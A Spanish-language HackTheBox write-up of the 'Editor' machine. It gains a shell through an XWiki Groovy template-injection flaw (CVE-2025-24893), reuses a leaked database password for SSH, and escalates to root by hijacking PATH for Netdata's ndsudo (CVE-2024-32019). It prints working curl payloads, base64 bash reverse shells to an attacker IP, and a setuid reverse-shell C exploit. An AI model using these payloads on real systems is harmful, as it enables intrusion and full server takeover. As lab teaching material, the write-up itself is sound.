---
title: Editor - Easy (HTB)
permalink: /Editor-HTB-Writeup/
tags:
  - XWiki
  - Linux
  - Easy
  - CVE-2024-32019
  - CVE-2025-24893
  - "Credentials Leakage"
  - "SSTI"
  - Netdata
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Editor - Easy (HTB)
seo_description: Explota un CVE en Xwiki y en la herramienta Ndsudo para vencer Editor.
excerpt: Explota un CVE en Xwiki y en la herramienta Ndsudo para vencer Editor.
header:
  overlay_image: /assets/images/headers/editor-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/editor-hackthebox.jpg
---
![image-center](/assets/images/posts/editor-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2025-24893 - Unauthenticated Remote Code Execution in `XWiki` via Server-Side Template Injection, Credentials Leakage, System Enumeration, CVE-2024-32019 - Local Privilege Escalation via Untrusted Search Path in `Netdata`
{: .notice--primary}

# Introducción

Editor es una máquina Linux de dificultad `Easy` en HackTheBox donde debemos vulnerar el servicio web `XWiki` para ganar acceso inicial. Enumeración básica del sistema y un CVE en la herramienta `ndsudo` nos permitirán obtener control completo sobre Editor.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.80
PING 10.10.11.80 (10.10.11.80) 56(84) bytes of data.
64 bytes from 10.10.11.80: icmp_seq=1 ttl=63 time=147 ms

--- 10.10.11.80 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.049/147.049/147.049/0.000 ms
~~~


## Nmap Scanning 

Realizaremos un escaneo que identifique puertos abiertos en la máquina víctima. En este caso, como estamos en un entorno controlado, podemos utilizar parámetros como `--min-rate 5000` para enviar gran cantidad de paquetes por segundo, estaremos utilizando el protocolo TCP en primera instancia

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.80 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-05 19:02 EDT
Nmap scan report for 10.10.11.80
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un escaneo a los puertos identificados con el propósito de obtener la versión de los servicios que se están ejecutando, además de un pequeño reconocimiento sobre estos

~~~ bash
nmap -p 22,80,8080 -sVC 10.10.11.80 -oN services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-05 19:20 EDT
Nmap scan report for 10.10.11.80
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|   Server Type: Jetty(10.0.20)
|_  WebDAV type: Unknown
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-server-header: Jetty(10.0.20)
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis

Existen diversos servicios expuestos, tales como dos servicios HTTP en los puertos `80` y `8080`. El servidor nos intenta redirigir a `editor.htb`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para que nuestro sistema pueda aplicar una resolución DNS

~~~ bash
cat /etc/hosts | grep editor         
10.10.11.80 editor.htb
~~~

Al navegar hasta `editor.htb`, encontraremos la siguiente web, donde podremos descargar un archivo `.deb`

![image-center](/assets/images/posts/editor-1-hackthebox.png)
{: .align-center}

### `xwiki`

En el `footer` encontraremos la sección de `Quick Links`, uno de ellos contiene la dirección URL de un sub-dominio

~~~ bash
curl http://wiki.editor.htb/xwiki/          
curl: (6) Could not resolve host: wiki.editor.htb
~~~

Agregaremos el sub-dominio `wiki.editor.htb` a nuestro archivo `/etc/hosts`, debido a que nuestro sistema necesita resolver el sub-dominio mediante la dirección IP de la máquina víctima

~~~ bash
cat /etc/hosts | grep editor      
10.10.11.80 editor.htb wiki.editor.htb
~~~

Si ahora navegamos hasta `wiki.editor.htb`, podremos ver la siguiente web, se trata del servicio `XWiki`.

> [`XWiki`](https://xwiki.com/en/) es una plataforma wiki de código abierto escrita en Java, que permite a los usuarios crear, colaborar y organizar información en línea
{: .notice--info}

![image-center](/assets/images/posts/editor-2-hackthebox.png)
{: .align-center}

En cuanto al puerto `8080`, podemos ver que se trata del mismo servicio presente en el subdominio

![image-center](/assets/images/posts/editor-3-hackthebox.png)
{: .align-center}

En el `footer` de la web podremos encontrar la versión de `Xwiki`, la versión es la `15.10.8`. El siguiente comando simplemente hace una solicitud HTTP desde la consola y filtra por las últimas `10` líneas del código fuente de la web

~~~ bash
curl -sL http://wiki.editor.htb | tail -n 10  

  <div id="xwikilicence"></div>
            <div id="xwikiplatformversion">
                    <a href="https://extensions.xwiki.org?id=org.xwiki.platform:xwiki-platform-distribution-debian-common:15.10.8:::/xwiki-commons-pom/xwiki-platform/xwiki-platform-distribution/xwiki-platform-distribution-debian/xwiki-platform-distribution-debian-common">
                XWiki Debian 15.10.8
              </a>
          </div>
  </footer>

</div></div></body>
</html>#
~~~
<br>


# Intrusión / Explotación
---
## CVE-2025-24893 - Unauthenticated Remote Code Execution in `XWiki` via Server-Side Template Injection

Esta vulnerabilidad en `xwiki` permite ejecución de comandos en el servidor **sin necesidad de autenticación previa**. Consiste en una inyección de código `Groovy` en plantillas de `xwiki` enviando una solicitud a `SolrSearch`. 

### Understanding Vulnerability

La vulnerabilidad afecta desde las versiones `5.3-milestone-2` hasta `15.10.11` y desde `16.0.0-rc-1` hasta `16.4.1`. La versión detectada (`15.10.8`) formaría parte de este rango, por lo que en teoría, **debería ser vulnerable**. Para más detalles, te dejo un artículo publicado por [OffSec](https://www.offsec.com/blog/cve-2025-24893/).

En el artículo anterior, se adjunta una [PoC](https://raw.githubusercontent.com/a1baradi/Exploit/refs/heads/main/CVE-2025-24893.py), utilizaremos la misma solicitud HTTP que se tramita al servidor, que luce más o menos de la siguiente manera

~~~ bash
http://<target>/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("id".execute().text){{/groovy}}{{/async}}
~~~

La solicitud HTTP cierra cualquier plantilla abierta con los caracteres `}}}` e inyecta nueva lógica `Groovy` en una nueva plantilla

~~~ groovy
}}}{{async async=false}}
~~~

Dentro del script podemos encontrar parte de la solicitud HTTP codificada en URL, donde el comando se envía dentro de los caracteres `%22`, que sería una comilla doble (`"`), utilizaremos `curl` para replicar esta solicitud maliciosa

~~~ bash
curl -s 'http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22ping%20-c1%2010.10.14.188%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d'
~~~

Iniciaremos un `sniffer` de tráfico ICMP con `tcpdump` para ver si la máquina víctima envía la traza

~~~ bash
tcpdump -i tun0 icmp -n 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
~~~

Cuando enviamos una traza ICMP a nuestra máquina, vemos que el comando logra ejecutarse correctamente porque recibimos tráfico hacia nuestra máquina

~~~ bash
18:18:10.621790 IP editor.htb > 10.10.14.188: ICMP echo request, id 9, seq 1, length 64
18:18:10.622717 IP 10.10.14.188 > editor.htb: ICMP echo reply, id 9, seq 1, length 64
18:18:11.063073 IP editor.htb > 10.10.14.188: ICMP echo request, id 10, seq 1, length 64
18:18:11.063144 IP 10.10.14.188 > editor.htb: ICMP echo reply, id 10, seq 1, length 64
~~~

Sin embargo, cuando intentamos enviar comandos más complejos (como una reverse shell), no se ejecutan como se espera

~~~ bash
bash -c 'bash -i >& /dev/tcp/10.10.14.188/443 0>&1'
~~~

`xwiki` espera que las plantillas tengan cierta estructura XML/HTML válida, entonces el payload debe ser cuidadosamente construido para no romper la plantilla original ni causar errores de `parsing`

### Exploiting

Necesitamos usar llaves (`{cmd,arg1,arg2}`) para evitar problemas con los espacios o caracteres especiales dentro del string en `Groovy`.

El siguiente payload imprime nuestra cadena decodificada desde `base64` y la ejecuta con `bash -i` (modo interactivo)

~~~ bash
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}
~~~

> Para evitar caracteres especiales, podemos utilizar una cadena en `base64` que represente nuestra reverse shell.
>
> La cadena en `base64` proviene de: `echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' | base64`
{: .notice--warning}

Encapsularemos este payload sucedido de `bash -c` para lograr ejecutar el comando correctamente

~~~ bash
}}}{{async async=false}}{{groovy}}println("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}".execute().text){{/groovy}}{{/async}}
~~~

Antes de enviar una solicitud maliciosa que nos conceda acceso, iniciaremos un listener que se encargue de recibir las conexiones entrantes, en mi caso he elegido el puerto `443`

~~~ bash
nc -lvnp 443 
listening on [any] 443 ...
~~~

La siguiente solicitud con `curl` envía el nuevo payload y debería iniciar una conexión hacia nuestra máquina atacante

> El payload debe ser codificado en URL para evitar conflictos, puedes usar herramientas como [`URL Encoder`](https://www.urlencoder.org/) para generar rápidamente un payload válido
{: .notice--warning}

~~~ bash
curl -s 'http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xODgvNDQzIDA%2BJjE%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d'
~~~


## Shell as `xwiki`

Desde nuestro listener, recibiremos una conexión con el usuario `xwiki`

~~~ bash
connect to [10.10.14.188] from (UNKNOWN) [10.10.11.80] 43466
bash: cannot set terminal process group (1062): Inappropriate ioctl for device
bash: no job control in this shell
xwiki@editor:/usr/lib/xwiki-jetty$ 
~~~

### TTY Treatment

Realizaremos un tratamiento de la TTY con el fin de mejorar la consola actual, así podremos operar de forma más cómoda limpiando la pantalla con `Ctrl+L`, poder presionar `Ctrl+C` sin cerrar la sesión, además de ajustar las proporciones de la terminal

~~~ bash
xwiki@editor:/usr/lib/xwiki-jetty$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
xwiki@editor:/usr/lib/xwiki-jetty$ ^Z
[1]  + 261566 suspended  nc -lvnp 443
root@parrot editor # stty raw -echo; fg            
[1]  + 261566 continued  nc -lvnp 443
                                     reset xterm
~~~

Cambiaremos el valor de la variable `TERM` para poder realizar `Ctrl+L`, además ajustaremos las proporciones de la terminal para que coincidan con nuestra máquina

~~~ bash
xwiki@editor:/usr/lib/xwiki-jetty$ export TERM=xterm
xwiki@editor:/usr/lib/xwiki-jetty$ stty rows 44 columns 184
~~~


## Finding Lateral Movement Path

En este punto nos encontramos dentro de la máquina con un usuario que no dispone de privilegios suficientes para realizar operaciones administrativas. 

Nuestro objetivo es convertirnos en el usuario `root`, aunque quizás necesitemos **migrar a otro usuario** primero, es por eso que realizaremos una **enumeración básica del sistema** para descubrir vías potenciales para elevar nuestros privilegios

### Users

Comenzaremos listando los usuarios existentes en el sistema, en este caso vemos el contenido de `/etc/passwd` y buscamos por palabras que terminen con `sh`

~~~ bash
xwiki@editor:/usr/lib/xwiki-jetty$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
~~~

### Internally Open Ports

Podemos listar puertos abiertos internamente, de esta forma identificaremos servicios que se estén ejecutando internamente en el sistema
 
~~~ bash
xwiki@editor:/usr/lib/xwiki-jetty$ ss -tunl | grep LISTEN
tcp   LISTEN 0      4096            127.0.0.1:8125       0.0.0.0:*          
tcp   LISTEN 0      4096            127.0.0.1:19999      0.0.0.0:*          
tcp   LISTEN 0      4096            127.0.0.1:44223      0.0.0.0:*          
tcp   LISTEN 0      151             127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096        127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      511               0.0.0.0:80         0.0.0.0:*          
tcp   LISTEN 0      128               0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      70              127.0.0.1:33060      0.0.0.0:*          
tcp   LISTEN 0      50     [::ffff:127.0.0.1]:8079             *:*          
tcp   LISTEN 0      50                      *:8080             *:*          
tcp   LISTEN 0      511                  [::]:80            [::]:*          
tcp   LISTEN 0      128                  [::]:22            [::]:*  
~~~

Logramos ver algunos puertos que nos pueden parecer comunes, por ejemplo comúnmente el puerto `3306` lo utiliza `mysql`


## Credentials Leakage

Buscando por archivos de configuración, podremos ver algunos como `xwiki.cfg` o `hibernate.cfg.xml`

~~~ bash
xwiki@editor:/usr/lib/xwiki-jetty$ find / -name "*.cfg*" 2>/dev/null | grep xwiki
/etc/xwiki/hibernate.cfg.xml
/etc/xwiki/hibernate.cfg.xml.ucf-dist
/etc/xwiki/xwiki.cfg
/var/lib/ucf/cache/:etc:xwiki:xwiki.cfg
/var/lib/ucf/cache/:etc:xwiki:hibernate.cfg.xml
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
/usr/lib/xwiki/WEB-INF/xwiki.cfg
/usr/share/xwiki/templates/mysql/hibernate.cfg.xml
/usr/share/xwiki/default/xwiki.cfg
~~~

> En Java, Hibernate es un **framework ORM** (Object-Relational Mapping) de código abierto que facilita la interacción entre aplicaciones Java y bases de datos relacionales (como el caso de `mysql`).
{: .notice--info}

~~~ bash
xwiki@editor:/usr/lib/xwiki-jetty$ cat /etc/xwiki/hibernate.cfg.xml | grep password | sort -u
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
~~~

Dentro del atributo `hibernate.connection.password` se almacenan las credenciales para conectarse a la base de datos, podría ser reutilizada para un usuario en el sistema

~~~ bash
theEd1t0rTeam99
~~~

Podríamos intentar migrar al usuario `oliver`, pero obtendremos un error al intentar utilizar el comando `su`

~~~ bash
xwiki@editor:/usr/lib/xwiki$ su oliver
Password: 
su: Authentication failure
~~~


## Shell as `oliver`

De igual forma debemos validar autenticación por `ssh`, las credenciales nos permitirán conectarnos como el usuario `oliver`

~~~ bash
ssh oliver@10.10.11.80

oliver@10.10.11.80\'s password:
oliver@editor:~$
~~~

Asignaremos el valor a la variable `TERM` que nos permitirá limpiar la pantalla con `Ctrl + L`

~~~ bash
oliver@editor:~$ export TERM=xterm
~~~ 

Ya podremos ver la flag del usuario sin privilegios

~~~ bash
oliver@editor:~$ cat user.txt 
e2c...
~~~
<br>


# Escalada de Privilegios
---
## Finding Privilege Escalation Path

En este punto somos el usuario `oliver`, necesitamos encontrar una forma de escalar nuestros privilegios para convertirnos en el usuario administrator (`root`) y concluir la máquina

### (Posible) Sudoers Privileges

Listaremos privilegios a nivel de `Sudoers` para verificar si podemos ejecutar recursos como otro usuario, el usuario `oliver` no puede ejecutar `sudo` en la máquina

~~~ bash
oliver@editor:~$ sudo -l
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
~~~

### SUID Binaries

Realizaremos una enumeración básica de permisos `SUID`, este permiso te permite ejecutar un binario como el propietario del recurso. 

Sabiendo esto, podríamos aprovechar alguna opción del binario que nos permita ejecutar un comando y así realizar acciones privilegiadas.

Encontraremos una herramienta bajo la ruta `/opt`, la se trata de `netdata`

~~~ bash
oliver@editor:~$ find / -perm -4000 2>/dev/null
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
~~~

Si verificamos los permisos de este archivo, el propietario es  `root`, además se otorga capacidad de ejecución para el grupo `netdata`, y `oliver` forma parte de este grupo

> **`ndsudo`** es una herramienta que viene con `Netdata Agent`, permite que `Netdata` ejecute ciertos comandos que requieren privilegios sin necesidad de usar `sudo` tradicional.
{: .notice--info}

~~~ bash
oliver@editor:~$ ls -l /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
-rwsr-x--- 1 root netdata 200576 Apr  1  2024 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo

oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
~~~


## CVE-2024-32019 - Local Privilege Escalation via Untrusted Search Path in `Netdata`

Esta vulnerabilidad afecta al programa `Netdata` y permite la escalada de privilegios mediante ejecución de comandos de forma privilegiada. 

`Netdata` ejecuta comandos externos a través de sus opciones, pero busca un binario `nvme` en la variable de entorno `PATH`, realiza operaciones privilegiadas a través de la herramienta `ndsudo`

~~~ bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme 
~~~

La explotación podría realizarse mediante la compilación de un ejecutable malicioso y la manipulación de la variable de entorno `PATH`, en un directorio donde tengamos permisos de escritura. El siguiente aviso en [Github](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93) detalla el procedimiento a seguir para conseguir la escalada.

A continuación comprobamos que `ndsudo` busca un ejecutable `nvme` dentro del `PATH` al utilizar una de sus opciones disponibles

~~~ bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

nvme : not available in PATH.
~~~

Vemos que no logra encontrar el binario `nvme`, si buscamos su existencia, podemos ver que existen algunos que no se contemplan en el PATH

~~~ bash
oliver@editor:~$ find / -name nvme 2>/dev/null
/usr/src/linux-headers-5.15.0-151/drivers/nvme
/usr/lib/modules/5.15.0-151-generic/kernel/drivers/nvme

oliver@editor:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
~~~

### Proof of Concept

El siguiente código malicioso definido en C, es un ejemplo básico que debería otorgarnos una consola como `root` al cambiar el `UID` a `0`. En mi caso lo he guardado con el nombre `exploit.c`

> En Linux, `UID` significa **Identificador de Usuario** (`User Identifier`). Es un número entero único que identifica a cada usuario en el sistema.
{: .notice--info}

~~~ c
#include <stdio.h>
#include <stdlib.h>

int main() {
	printf("[+] Exploiting CVE-2024-32019...\n");
	setuid(0);
	system("bash -c 'bash -i >& /dev/tcp/10.10.14.188/443 0>&1'");
	return 0;
}
~~~

- `setuid(0)`: Cambia el `userid` a `0`, el cual hace referencia a `root`.
- `system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")`: Inicia una conexión enviando una sesión interactiva con Bash a nuestra máquina atacante.

Compilaremos el exploit con el nombre de `nvme`, el cual es necesario según los detalles del CVE

~~~ bash
gcc exploit.c -o nvme -static
~~~

Iniciaremos un servidor HTTP para transferir el ejecutable malicioso rápidamente a la máquina víctima

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Desde la máquina víctima descargamos el binario `nvme` y le asignamos permisos de ejecución

~~~ bash
oliver@editor:~$ wget http://10.10.14.188/nvme
oliver@editor:~$ chmod +x nvme
~~~


## Root Time

Iniciaremos un listener que se encargue de recibir la conexión, usaremos el mismo que definimos en el exploit.

~~~ bash
nc -lvnp 443
~~~

Asignaremos un nuevo `PATH`, comenzando por el directorio actual. Entonces `ndsudo` buscará el binario `nvme` aquí, cuando lo encuentre, ejecutará el comando definido en el exploit

~~~ bash
oliver@editor:~$ PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list 
~~~

Desde nuestro listener recibiremos una consola como `root`

~~~ bash
connect to [10.10.14.188] from (UNKNOWN) [10.10.11.80] 56112
root@editor:/home/oliver# id 
id
uid=0(root) gid=1000(oliver) groups=1000(oliver),999(netdata)
~~~

### TTY Treatment

Haremos un tratamiento de la TTY para operar con una consola más cómoda al igual que lo hicimos con el usuario `xwiki`

~~~ bash
root@editor:/home/oliver# script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
root@editor:/home/oliver# ^Z
[1]  + 23396 suspended  nc -lvnp 443
root@parrot exploits # stty raw -echo;fg     
[1]  + 23396 continued  nc -lvnp 443
                                    reset xterm
~~~

Realizaremos los cambios necesarios para poder limpiar la pantalla con `Ctrl+L` además de ajustar las proporciones de la terminal

~~~ bash
root@editor:/home/oliver# export TERM=xterm
root@editor:/home/oliver# stty rows columns 184
~~~

Por último nos quedaría leer la flag del sistema ubicada en el directorio `/root`

~~~ bash
root@editor:/home/oliver# cd /root 
root@editor:/root# cat root.txt 
d76...
~~~

Gracias por leer, a continuación te dejo la cita del día.

> The secret to a rich life is to have more beginnings than endings.
> — Dave Weinbaum
{: .notice--info}
